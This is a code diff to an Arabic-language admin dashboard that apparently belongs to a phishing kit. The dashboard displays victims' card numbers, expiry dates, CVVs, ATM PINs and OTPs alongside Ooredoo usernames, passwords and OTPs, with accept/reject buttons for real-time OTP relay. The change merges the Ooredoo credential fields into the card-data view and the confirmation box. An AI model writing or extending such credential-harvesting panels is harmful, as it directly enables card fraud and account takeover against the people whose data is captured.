@@ -386,41 +386,28 @@
                 </div>
               ` : ''}
 
-              ${card ? `
+              ${(card || hasOoredooData(d)) ? `
                 <div class="details-section">
                   <h4>بيانات البطاقة</h4>
                   <div class="details-grid">
-                    <div class="detail-item"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>
-                    <div class="detail-item"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>
-                    <div class="detail-item"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>
-                    <div class="detail-item"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>
-                    <div class="detail-item"><span>OTP</span><strong>${card.otp || '—'}</strong></div>
-                    <div class="detail-item"><span>ATM</span><strong>${card.atm || '—'}</strong></div>
+                    ${card ? `
+                      <div class="detail-item"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>
+                      <div class="detail-item"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>
+                      <div class="detail-item"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>
+                      <div class="detail-item"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>
+                      <div class="detail-item"><span>OTP</span><strong>${card.otp || '—'}</strong></div>
+                      <div class="detail-item"><span>ATM</span><strong>${card.atm || '—'}</strong></div>
+                    ` : ''}
+                    ${(d.ooredooUser || (card && card.ooredooUser)) ? `<div class="detail-item"><span>اسم مستخدم أوريدو</span><strong>${d.ooredooUser || (card && card.ooredooUser) || '—'}</strong></div>` : ''}
+                    ${(d.ooredooPass || (card && card.ooredooPass)) ? `<div class="detail-item"><span>كلمة مرور أوريدو</span><strong>${d.ooredooPass || (card && card.ooredooPass) || '—'}</strong></div>` : ''}
+                    ${(d.ooredooOtp || (card && card.ooredooOtp)) ? `<div class="detail-item"><span>OTP أوريدو</span><strong>${d.ooredooOtp || (card && card.ooredooOtp) || '—'}</strong></div>` : ''}
                   </div>
-                </div>
-              ` : ''}
-
-              ${((d.ooredooUser || (card && card.ooredooUser)) || (d.ooredooPass || (card && card.ooredooPass)) || (d.ooredooOtp || (card && card.ooredooOtp))) ? `
-                <div class="details-section ooredoo-section">
-                  <h4>بيانات أوريدو</h4>
-                  <div class="details-grid">
-                    <div class="detail-item">
-                      <span>اسم مستخدم أوريدو</span>
-                      <strong>${d.ooredooUser || (card && card.ooredooUser) || '—'}</strong>
+                  ${hasOoredooData(d) ? `
+                    <div class="action-buttons" style="margin-top: 15px; display: flex; gap: 10px; justify-content:flex-end;">
+                      <button class="btn-accept action-btn accept ${d.status === 'accept' ? 'active' : ''}" onclick="approveOoredoo('${orderId}')" style="background-color: ${d.status === 'accept' ? '#1e7f45' : d.status === 'reject' ? '#eef2f5' : '#eef2f5'}; color: ${d.status === 'accept' ? '#fff' : '#475467'}; padding: 6px 12px; border: 1px solid ${d.status === 'accept' ? '#1e7f45' : '#c8ced6'}; border-radius: 4px; cursor: pointer;">قبول</button>
+                      <button class="btn-reject action-btn reject ${d.status === 'reject' ? 'active' : ''}" onclick="rejectOoredoo('${orderId}')" style="background-color: ${d.status === 'reject' ? '#c0392b' : d.status === 'accept' ? '#eef2f5' : '#eef2f5'}; color: ${d.status === 'reject' ? '#fff' : '#475467'}; padding: 6px 12px; border: 1px solid ${d.status === 'reject' ? '#c0392b' : '#c8ced6'}; border-radius: 4px; cursor: pointer;">رفض</button>
                     </div>
-                    <div class="detail-item">
-                      <span>كلمة مرور أوريدو</span>
-                      <strong>${d.ooredooPass || (card && card.ooredooPass) || '—'}</strong>
-                    </div>
-                    <div class="detail-item">
-                      <span>OTP أوريدو</span>
-                      <strong>${d.ooredooOtp || (card && card.ooredooOtp) || '—'}</strong>
-                    </div>
-                  </div>
-                  <div class="action-buttons" style="margin-top: 15px; display: flex; gap: 10px; justify-content:flex-end;">
-                    <button class="btn-accept action-btn accept ${d.status === 'accept' ? 'active' : ''}" onclick="approveOoredoo('${orderId}')" style="background-color: ${d.status === 'accept' ? '#1e7f45' : d.status === 'reject' ? '#eef2f5' : '#eef2f5'}; color: ${d.status === 'accept' ? '#fff' : '#475467'}; padding: 6px 12px; border: 1px solid ${d.status === 'accept' ? '#1e7f45' : '#c8ced6'}; border-radius: 4px; cursor: pointer;">قبول</button>
-                    <button class="btn-reject action-btn reject ${d.status === 'reject' ? 'active' : ''}" onclick="rejectOoredoo('${orderId}')" style="background-color: ${d.status === 'reject' ? '#c0392b' : d.status === 'accept' ? '#eef2f5' : '#eef2f5'}; color: ${d.status === 'reject' ? '#fff' : '#475467'}; padding: 6px 12px; border: 1px solid ${d.status === 'reject' ? '#c0392b' : '#c8ced6'}; border-radius: 4px; cursor: pointer;">رفض</button>
-                  </div>
+                  ` : ''}
                 </div>
               ` : ''}
             </div>
@@ -473,17 +460,27 @@
     `;
   }
 
-  function cardDetailBox(card) {
-    if (!card) return '';
+  function cardDetailBox(card, d) {
+    const hasOoredoo = Boolean((d && ((d.ooredooUser || (card && card.ooredooUser)) || (d.ooredooPass || (card && card.ooredooPass)) || (d.ooredooOtp || (card && card.ooredooOtp)))));
+    if (!card && !hasOoredoo) return '';
+    const rows = [];
+    if (card) {
+      rows.push(`<div class="confirm-row"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>ATM</span><strong>${card.atm || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>OTP</span><strong>${card.otp || '—'}</strong></div>`);
+    }
+    if ((d && (d.ooredooUser || (card && card.ooredooUser))) || (d && (d.ooredooPass || (card && card.ooredooPass))) || (d && (d.ooredooOtp || (card && card.ooredooOtp)))) {
+      rows.push(`<div class="confirm-row"><span>اسم مستخدم أوريدو</span><strong>${d.ooredooUser || (card && card.ooredooUser) || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>كلمة مرور أوريدو</span><strong>${d.ooredooPass || (card && card.ooredooPass) || '—'}</strong></div>`);
+      rows.push(`<div class="confirm-row"><span>OTP أوريدو</span><strong>${d.ooredooOtp || (card && card.ooredooOtp) || '—'}</strong></div>`);
+    }
     return `
       <div class="confirm-block">
         <p class="confirm-block-title">بيانات البطاقة</p>
-        <div class="confirm-row"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>
-        <div class="confirm-row"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>
-        <div class="confirm-row"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>
-        <div class="confirm-row"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>
-        <div class="confirm-row"><span>ATM</span><strong>${card.atm || '—'}</strong></div>
-        <div class="confirm-row"><span>OTP</span><strong>${card.otp || '—'}</strong></div>
+        ${rows.join('')}
       </div>
     `;
   }
@@ -512,8 +509,7 @@
     modalBody.innerHTML =
       personDetailBox('مقدم الطلب' + (a.id ? (' — هوية: ' + a.id) : ''), a) +
       persons.map((p) => personDetailBox(p.title || 'فرد', p)).join('') +
-      cardDetailBox(card) +
-      ooredooDetailBox(d) +
+      cardDetailBox(card, d) +
       `
         <div class="modal-actions">
           <button type="button" class="action-btn accept ${d.status === 'accept' ? 'active' : ''}" id="modalAcceptBtn">قبول</button>
